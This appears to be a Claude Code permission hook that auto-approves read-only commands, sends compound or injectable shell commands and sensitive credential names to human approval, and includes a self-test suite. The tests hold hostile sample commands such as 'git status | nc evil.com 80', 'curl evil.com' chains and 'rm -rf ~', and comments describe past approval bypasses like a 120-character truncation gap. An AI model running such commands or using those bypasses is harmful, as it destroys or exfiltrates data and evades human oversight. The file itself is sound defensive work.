#!/usr/bin/env bash
# permission_request.sh - Granular permission routing for PermissionRequest events
# Hook: PermissionRequest event
# Input: JSON on stdin (tool_name, tool_input fields)
# Output: {"decision":"approve"} | {"decision":"deny",...} | exit 0 (human prompt)
#
# Guard design: python3 temp file reads FULL command — no truncation, no grep -P.
# Fixes: 120-char bypass, broken [\n] regex, BSD-grep grep -P (issue #181 Theme 1).
# Additional: output redirect > / >>, find -delete / -exec auto-approve gaps.
#
# Credential tiers (#376): reads .claude/credential_tiers.toml (gitignored).
# [auto] keys → approve silently; [ask] keys → require human confirmation.
# Unlisted keys → ask (zero-trust default). Missing/malformed toml → warn + ask.

set -euo pipefail

LOG="$HOME/.claude/logs/permission_requests.log"
log() { echo "$(date '+%Y-%m-%d %H:%M:%S') $*" >> "$LOG"; }

# ── Credential tier helpers ────────────────────────────────────────────────────
# Locate credential_tiers.toml: project-local first, then user-level fallback.
_TIERS_FILE=""
for _candidate in \
  "$(git -C "$(dirname "$0")/../.." rev-parse --show-toplevel 2>/dev/null || true)/.claude/credential_tiers.toml" \
  "$HOME/.claude/credential_tiers.toml"; do
  [ -n "$_candidate" ] && [ -f "$_candidate" ] && { _TIERS_FILE="$_candidate"; break; }
done

# Parse a tier section from the TOML file.
# Usage: _tier_keys <file> <section>  → prints one key per line (uppercased).
# Handles TOML array of strings: keys = ["FOO", "BAR"]. No full TOML parser.
_tier_keys() {
  local file="$1" section="$2"
  # Extract lines between [section] header and next [header], then pull out
  # quoted strings that look like environment variable names (ALL_CAPS with _).
  awk -v sec="[$section]" '
    /^\[/ { in_sec = ($0 == sec); next }
    in_sec { print }
  ' "$file" \
    | grep -oE '"[A-Z][A-Z0-9_]*"' \
    | tr -d '"'
}

# _cred_tier KEY_NAME → "auto" | "ask" | "unknown"
_cred_tier() {
  local key="$1"
  if [ -z "$_TIERS_FILE" ]; then
    echo "unknown"; return
  fi
  if _tier_keys "$_TIERS_FILE" "auto" 2>/dev/null | grep -qxF "$key"; then
    echo "auto"; return
  fi
  if _tier_keys "$_TIERS_FILE" "ask" 2>/dev/null | grep -qxF "$key"; then
    echo "ask"; return
  fi
  echo "unknown"
}

# Write python guard to a temp file so we can pipe stdin to it without heredoc clash.
_PY=$(mktemp /tmp/perm_guard_XXXXXX.py)
trap 'rm -f "$_PY"' EXIT

cat > "$_PY" << 'PYEOF'
import json, re, sys

# On ANY unexpected failure: emit NEEDS_HUMAN so the shell falls through to
# the normal human-approval prompt rather than exiting non-zero under set -e.
def safe_exit(tool="unknown", verdict="NEEDS_HUMAN", cmd=""):
    print(tool)
    print(verdict)
    print(cmd[:200])
    sys.exit(0)

try:
    d = json.load(sys.stdin)
except Exception:
    safe_exit()

try:
    tool = d.get("tool_name", "unknown")
    raw_ti = d.get("tool_input", {})
    # Treat null / string / non-dict tool_input as empty dict (avoids AttributeError)
    ti = raw_ti if isinstance(raw_ti, dict) else {}
    # FULL command — no truncation in the guard path
    cmd = str(ti.get("command", ti.get("path", ti.get("url", ""))))
except Exception:
    safe_exit()

# Metacharacter guard — FULL cmd, no truncation. Order: cheapest first.
try:
    reason = None

    if ";" in cmd:
        reason = "semicolon"
    elif "&&" in cmd:
        reason = "&&"
    elif "||" in cmd:
        reason = "||"
    elif "`" in cmd:
        reason = "backtick"
    elif "$(" in cmd:
        reason = "subshell $("
    elif "\n" in cmd:
        reason = "newline"
    elif "\r" in cmd:
        reason = "carriage-return"
    elif ">>" in cmd:
        reason = "append redirect >>"
    elif re.search(r'(?<!>)>(?![>=])', cmd):   # bare > (not >> or >=)
        reason = "output redirect >"
    else:
        if re.search(r'(?<!\|)\|(?!\|)', cmd):    # bare pipe (not ||)
            reason = "bare pipe"
        elif re.search(r'(?<!&)&(?!&)', cmd):     # bare & (not &&)
            reason = "bare background &"

    if reason:
        safe_exit(tool, "UNSAFE:" + reason, cmd)

    # Read-only matchers (guard passed — no metachar). \s+ matches tab/multispace.
    verdict = "NEEDS_HUMAN"
    if re.match(
        r'^git\s+(-C\s+\S+\s+)?(status|log|diff|show|branch|remote|tag|describe|rev-parse)(\s|$)',
        cmd
    ):
        verdict = "APPROVE_GIT"
    elif re.match(
        r'^(ls|which|stat|wc|head|tail|cat|file|du|df|pwd|echo|printf|uname|sw_vers)(\s|$)',
        cmd
    ):
        # NOTE: `find` is intentionally excluded from APPROVE_BASH.
        # A blacklist of dangerous find flags (-exec, -execdir, -ok, -okdir, -delete,
        # -fprint, -fls) is too subtle — new dangerous flags are added without
        # updating the guard. Instead, find always goes through normal human approval.
        verdict = "APPROVE_BASH"

    safe_exit(tool, verdict, cmd)

except Exception:
    safe_exit(tool if 'tool' in dir() else "unknown", "NEEDS_HUMAN",
              cmd if 'cmd' in dir() else "")
PYEOF

# ── Self-test mode ──────────────────────────────────────────────────────
# Usage: CLAUDE_HOOK_SELFTEST=1 bash .claude/hooks/permission_request.sh
# Accept both PERMISSION_REQUEST_SELFTEST and CLAUDE_HOOK_SELFTEST (per agent_push_guard.sh convention)
_SELFTEST="${PERMISSION_REQUEST_SELFTEST:-${CLAUDE_HOOK_SELFTEST:-0}}"
if [ "$_SELFTEST" = "1" ]; then
  _pass=0; _fail=0
  SCRIPT_PATH="$(realpath "$0")"

  _selftest_case() {
    local desc="$1" payload="$2" expect="$3"
    local out
    out=$(printf '%s' "$payload" | \
      env PERMISSION_REQUEST_SELFTEST=0 /usr/bin/env bash "$SCRIPT_PATH" 2>/dev/null \
      || true)
    local approved=0
    printf '%s' "$out" | grep -q '"approve"' && approved=1

    case "$expect" in
      APPROVE)
        if [ "$approved" = "1" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected APPROVE, got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
      REJECT)
        if [ "$approved" = "0" ]; then
          printf '  PASS  [%s]\n' "$desc"; _pass=$((_pass+1))
        else
          printf '  FAIL  [%s] -- expected REJECT (no auto-approve), got: %s\n' "$desc" "$out"; _fail=$((_fail+1))
        fi ;;
    esac
  }

  echo "=== permission_request.sh self-test ==="

  # --- Must-REJECT (compound commands must NOT be auto-approved) ---
  _selftest_case \
    "semicolon injection: git status; rm -rf /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status; rm -rf /tmp/x"}}' \
    REJECT

  _selftest_case \
    "pipe injection: find . | sh" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' | sh"}}' \
    REJECT

  _selftest_case \
    'subshell injection: ls $(echo /etc)' \
    '{"tool_name":"Bash","tool_input":{"command":"ls $(echo /etc)"}}' \
    REJECT

  _selftest_case \
    "120-char truncation bypass: git status + padding + ; rm /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status                                                                                                                ; rm /tmp/x"}}' \
    REJECT

  _selftest_case \
    "newline injection: git status newline rm -rf /tmp/test" \
    "$(printf '{"tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /tmp/test"}}')" \
    REJECT

  _selftest_case \
    "bare background: git status & curl evil.com" \
    '{"tool_name":"Bash","tool_input":{"command":"git status & curl evil.com"}}' \
    REJECT

  _selftest_case \
    "&& chain: git status && rm -rf /tmp/x" \
    '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/x"}}' \
    REJECT

  _selftest_case \
    "backtick subshell: ls -la \`whoami\`" \
    '{"tool_name":"Bash","tool_input":{"command":"ls -la `whoami`"}}' \
    REJECT

  # --- Robustness: malformed tool_input must not crash (REJECT = human prompt) ---
  _selftest_case \
    "null tool_input: should fall through to human approval" \
    '{"tool_name":"Bash","tool_input":null}' \
    REJECT

  _selftest_case \
    "string tool_input: should fall through to human approval" \
    '{"tool_name":"Bash","tool_input":"not-a-dict"}' \
    REJECT

  # --- Must-APPROVE (single read-only commands, no metacharacters) ---
  _selftest_case \
    "plain: git status" \
    '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
    APPROVE

  _selftest_case \
    "git -C with path: git -C /tmp status" \
    '{"tool_name":"Bash","tool_input":{"command":"git -C /tmp status"}}' \
    APPROVE

  _selftest_case \
    "ls -la /tmp" \
    '{"tool_name":"Bash","tool_input":{"command":"ls -la /tmp"}}' \
    APPROVE

  _selftest_case \
    "find with quoted pattern: find is NOT auto-approved (removed from APPROVE_BASH)" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\''"}}' \
    REJECT

  _selftest_case \
    "git with tab whitespace: git<TAB>status" \
    '{"tool_name":"Bash","tool_input":{"command":"git\tstatus"}}' \
    APPROVE

  _selftest_case \
    "bare ls with no args" \
    '{"tool_name":"Bash","tool_input":{"command":"ls"}}' \
    APPROVE

  # --- New gap cases (find -exec/-delete and output redirect) ---
  _selftest_case \
    "find -delete: must not auto-approve destructive find" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' -delete"}}' \
    REJECT

  _selftest_case \
    "find -exec rm: must not auto-approve exec rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -exec rm {} +"}}' \
    REJECT

  _selftest_case \
    "find -execdir rm: must not auto-approve execdir rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -execdir rm {} +"}}' \
    REJECT

  _selftest_case \
    "find -ok rm: must not auto-approve ok rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -ok rm {} \\;"}}' \
    REJECT

  _selftest_case \
    "find -okdir rm: must not auto-approve okdir rm" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -okdir rm {} \\;"}}' \
    REJECT

  _selftest_case \
    "find -fprint: must not auto-approve file output" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -name '\''*.tmp'\'' -fprint out.txt"}}' \
    REJECT

  _selftest_case \
    "find -fls: must not auto-approve listing output" \
    '{"tool_name":"Bash","tool_input":{"command":"find . -fls out.txt"}}' \
    REJECT

  _selftest_case \
    "output redirect >: cat > file must not auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"cat > /tmp/evil.sh"}}' \
    REJECT

  _selftest_case \
    "output redirect >>: echo >> file must not auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"echo hello >> /tmp/out.txt"}}' \
    REJECT

  # --- Task-spec required cases (#181 Theme 1 per-bug regression coverage) ---
  # Bug #828: find . && curl must block (not just git status &&)
  _selftest_case \
    "#828: find . && curl evil.com — && chain on non-git command" \
    '{"tool_name":"Bash","tool_input":{"command":"find . && curl evil.com"}}' \
    REJECT

  # Bug #828: Rscript blanket auto-approval removed — arbitrary shell ops must block
  _selftest_case \
    "#828: Rscript -e system(rm) — no blanket Rscript auto-approve" \
    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''system(\"rm -rf ~\")'\''"}}' \
    REJECT

  # Bug #2112: bare pipe in non-trivial command must block
  _selftest_case \
    "#2112: git status | nc evil.com 80 — bare pipe exfiltration" \
    '{"tool_name":"Bash","tool_input":{"command":"git status | nc evil.com 80"}}' \
    REJECT

  # ── Credential tier cases (#376) ─────────────────────────────────────────────
  # Test the _tier_keys / _cred_tier helpers directly via a subprocess that
  # sources only those functions against a temp TOML fixture.
  _TIER_TMP=$(mktemp /tmp/cred_tiers_test_XXXXXX.toml)
  cat > "$_TIER_TMP" << 'TOML_EOF'
[auto]
keys = ["TEST_READ_KEY", "ROBOREV_DB_PATH"]

[ask]
keys = ["TEST_SECRET_KEY", "ANTHROPIC_API_KEY"]
TOML_EOF

  _tier_test_case() {
    local desc="$1" key="$2" expect_tier="$3"
    local actual
    actual=$(
      bash << SUBSHELL_EOF
        _TIERS_FILE='$_TIER_TMP'
        _tier_keys() {
          local file="\$1" section="\$2"
          awk -v sec="[\$section]" '
            /^\[/ { in_sec = (\$0 == sec); next }
            in_sec { print }
          ' "\$file" | grep -oE '"[A-Z][A-Z0-9_]*"' | tr -d '"'
        }
        _cred_tier() {
          local key="\$1"
          if [ -z "\$_TIERS_FILE" ]; then echo "unknown"; return; fi
          if _tier_keys "\$_TIERS_FILE" "auto" 2>/dev/null | grep -qxF "\$key"; then
            echo "auto"; return
          fi
          if _tier_keys "\$_TIERS_FILE" "ask" 2>/dev/null | grep -qxF "\$key"; then
            echo "ask"; return
          fi
          echo "unknown"
        }
        _cred_tier '$key'
SUBSHELL_EOF
    )
    if [ "$actual" = "$expect_tier" ]; then
      printf '  PASS  [%s] tier=%s\n' "$desc" "$actual"; _pass=$((_pass+1))
    else
      printf '  FAIL  [%s] expected tier=%s got tier=%s\n' "$desc" "$expect_tier" "$actual"; _fail=$((_fail+1))
    fi
  }

  _tier_test_case "ask-tier key: TEST_SECRET_KEY"   "TEST_SECRET_KEY"   "ask"
  _tier_test_case "auto-tier key: TEST_READ_KEY"    "TEST_READ_KEY"     "auto"
  _tier_test_case "unlisted key: UNKNOWN_VAR"       "UNKNOWN_VAR"       "unknown"
  _tier_test_case "auto-tier: ROBOREV_DB_PATH"      "ROBOREV_DB_PATH"   "auto"

  # (#376) Malformed TOML graceful skip: should still return 'unknown' (not crash)
  _TIER_BAD=$(mktemp /tmp/cred_tiers_bad_XXXXXX.toml)
  printf 'this is not valid toml {{{\n' > "$_TIER_BAD"
  actual_bad=$(
    bash << SUBSHELL_EOF2
      _TIERS_FILE='$_TIER_BAD'
      _tier_keys() {
        local file="\$1" section="\$2"
        awk -v sec="[\$section]" '
          /^\[/ { in_sec = (\$0 == sec); next }
          in_sec { print }
        ' "\$file" | grep -oE '"[A-Z][A-Z0-9_]*"' | tr -d '"'
      }
      _cred_tier() {
        local key="\$1"
        if [ -z "\$_TIERS_FILE" ]; then echo "unknown"; return; fi
        if _tier_keys "\$_TIERS_FILE" "auto" 2>/dev/null | grep -qxF "\$key"; then
          echo "auto"; return
        fi
        if _tier_keys "\$_TIERS_FILE" "ask" 2>/dev/null | grep -qxF "\$key"; then
          echo "ask"; return
        fi
        echo "unknown"
      }
      _cred_tier "ANY_KEY"
SUBSHELL_EOF2
  )
  if [ "$actual_bad" = "unknown" ]; then
    printf '  PASS  [malformed toml: returns unknown, no crash]\n'; _pass=$((_pass+1))
  else
    printf '  FAIL  [malformed toml] expected unknown got %s\n' "$actual_bad"; _fail=$((_fail+1))
  fi

  rm -f "$_TIER_TMP" "$_TIER_BAD"

  echo "=== Results: $_pass passed, $_fail failed (33 total) ==="
  [ "$_fail" -eq 0 ] && exit 0 || exit 1
fi

_input=$(cat)

# ── All extraction + guard logic in python3 ────────────────────────────
# Returns 3 lines: tool_name / verdict / command[:200]
# Verdict values: UNSAFE:<reason> | APPROVE_GIT | APPROVE_BASH | NEEDS_HUMAN
_verdict=$(printf '%s' "$_input" | python3 "$_PY")

_tool=$(printf '%s' "$_verdict" | sed -n '1p')
_guard=$(printf '%s' "$_verdict" | sed -n '2p')
_action_log=$(printf '%s' "$_verdict" | sed -n '3p')

log "REQUEST: tool=$_tool action=$_action_log"

# ── Auto-approve: read-only tools ──────────────────────────────────────
case "$_tool" in
  Read|Glob|Grep|WebFetch|WebSearch|ListMcpResourcesTool|ReadMcpResourceTool)
    log "AUTO-APPROVE: read-only tool $_tool"
    printf '{"decision":"approve","reason":"Read-only tool"}\n'
    exit 0
    ;;
esac

# ── Credential tier check (#376) ──────────────────────────────────────
# Scan the command string for ALL_CAPS_WITH_UNDERSCORES patterns that look
# like environment variable names. If any match an [ask]-tier key (or are
# unlisted — zero-trust default), require human confirmation. If all matched
# names are in [auto], allow without prompt.
#
# This check runs BEFORE the Bash metacharacter guard so that even
# syntactically clean credential reads of high-value keys get human approval.
if [ -n "$_TIERS_FILE" ]; then
  _found_ask=0
  _found_auto_only=1
  _cred_names=$(printf '%s' "$_action_log" | grep -oE '\b[A-Z][A-Z0-9_]{2,}\b' || true)
  if [ -n "$_cred_names" ]; then
    for _cname in $_cred_names; do
      _tier=$(_cred_tier "$_cname")
      case "$_tier" in
        ask|unknown) _found_ask=1; _found_auto_only=0 ;;
        auto) ;;  # keep _found_auto_only=1
      esac
    done
    if [ "$_found_ask" = "1" ]; then
      log "CRED-TIER-ASK: tool=$_tool key_pattern_in_cmd=$_action_log"
      # Fall through to human prompt (sound + exit 0)
      (/usr/bin/afplay -v 0.5 /System/Library/Sounds/Sosumi.aiff &) 2>/dev/null
      exit 0
    fi
    if [ "$_found_auto_only" = "1" ] && [ -n "$_cred_names" ]; then
      log "CRED-TIER-AUTO: tool=$_tool key_pattern_in_cmd=$_action_log"
      printf '{"decision":"approve","reason":"Credential tier: auto"}\n'
      exit 0
    fi
  fi
elif [ -f "$(git -C "$(dirname "$0")/../.." rev-parse --show-toplevel 2>/dev/null || true)/.claude/credential_tiers.toml.template" ] \
  && [ ! -f "$(git -C "$(dirname "$0")/../.." rev-parse --show-toplevel 2>/dev/null || true)/.claude/credential_tiers.toml" ]; then
  # Template exists but live file hasn't been created yet — warn once to stderr.
  echo "WARN: credential_tiers.toml not found. Run: cp .claude/credential_tiers.toml.template .claude/credential_tiers.toml" >&2
fi

# ── Bash-specific guard and auto-approval ──────────────────────────────
if [ "$_tool" = "Bash" ]; then
  # SECURITY GUARD: python3 checks FULL command for metacharacters.
  # UNSAFE:<reason> means compound/injectable — fall through to human prompt.
  case "$_guard" in
    UNSAFE:*)
      log "COMPOUND-REJECTED (${_guard#UNSAFE:}): $_action_log"
      # Exit 0 with no output → normal human-approval prompt
      exit 0
      ;;
    APPROVE_GIT)
      log "AUTO-APPROVE: read-only git: $_action_log"
      printf '{"decision":"approve","reason":"Read-only git command"}\n'
      exit 0
      ;;
    APPROVE_BASH)
      log "AUTO-APPROVE: read-only bash: $_action_log"
      printf '{"decision":"approve","reason":"Read-only inspection command"}\n'
      exit 0
      ;;
    # NEEDS_HUMAN falls through to notification below
  esac
  # Rscript REMOVED from auto-approve: can execute arbitrary fs/network/process ops.
  # Require human approval for every Rscript call (see Finding 2 in issue #181).
fi

# ── Needs human approval: notify and fall through ─────────────────────
log "NEEDS-APPROVAL: tool=$_tool action=$_action_log"

# Distinctive sound (Sosumi = "so sue me" — the classic Mac warning)
(/usr/bin/afplay -v 0.5 /System/Library/Sounds/Sosumi.aiff &) 2>/dev/null

# Optional ntfy.sh push notification (set NTFY_TOPIC env var to enable)
NTFY_TOPIC="${NTFY_TOPIC:-}"
if [ -n "$NTFY_TOPIC" ]; then
  _short="${_action_log:0:80}"
  curl -s \
    -H "Title: Claude Code: Permission Needed" \
    -H "Priority: high" \
    -H "Tags: warning,lock" \
    -d "Tool: $_tool | $_short" \
    "https://ntfy.sh/$NTFY_TOPIC" >/dev/null 2>&1 &
fi

# Exit 0 → normal permission prompt shown to user
exit 0
